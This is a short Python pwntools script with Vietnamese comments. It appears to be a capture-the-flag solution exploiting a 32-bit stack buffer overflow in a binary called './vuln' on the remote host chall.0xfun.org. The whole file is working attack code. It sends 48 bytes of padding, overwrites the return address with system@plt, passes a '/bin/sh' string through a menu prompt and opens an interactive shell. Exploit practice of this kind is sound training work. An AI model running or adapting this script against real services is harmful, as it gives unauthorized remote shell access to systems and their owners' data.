from pwn import *

# Khởi động process
# p = process('./vuln')
p = remote('chall.0xfun.org', 65413)
elf = ELF('./vuln')

# 1. Tìm địa chỉ các thành phần cần thiết
system_plt = elf.plt['system']
# Nếu không tìm thấy chuỗi /bin/sh trong file, 
# ta có thể dùng địa chỉ của một biến toàn cục mà ta có thể ghi đè.
# Giả sử ta tìm thấy chuỗi "/bin/sh" trong libc hoặc file
bin_sh = next(elf.search(b'/bin/sh')) # Hoặc địa chỉ khác

# 2. Xây dựng Payload
# Padding 48 bytes (44 bytes buffer + 4 bytes EBP)
payload = b"A" * 48 
payload += p32(system_plt)   # Ghi đè Return Address bằng system()
payload += p32(0xdeadbeef)   # Return address sau khi thoát system (không quan trọng)
payload += p32(bin_sh)       # Tham số đầu tiên của system()

# 3. Gửi payload
p.sendlineafter(b"> ", b"2") # Chọn option set_welcome_message
p.sendlineafter(b"(up to 32 chars):", payload)

# 4. Tương tác với shell
p.interactive()
